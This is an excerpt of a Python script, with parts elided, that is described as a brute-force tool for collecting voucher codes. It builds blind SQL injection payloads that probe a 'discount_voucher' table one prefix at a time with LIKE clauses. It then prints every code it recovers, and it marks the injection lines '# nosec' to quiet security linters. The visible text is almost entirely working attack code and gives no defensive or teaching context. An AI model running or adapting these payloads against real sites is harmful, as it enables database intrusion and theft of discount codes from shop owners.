...
# Created a brute force script to collect voucher codes
...
def test_char(prefix, is_exact=False):
    if is_exact:
        payload = f"' AND (SELECT COUNT(*) FROM discount_voucher WHERE code = '{prefix}') > 0 #"# nosec
    else:
        payload = f"' AND (SELECT COUNT(*) FROM discount_voucher WHERE code LIKE '{prefix}%') > 0 #"# nosec
...
print("Finding all voucher codes...")
all_keys = find_all_keys()
print(f"\nFound {len(all_keys)} voucher codes:")
for key in all_keys:
    print(f"  {key}")
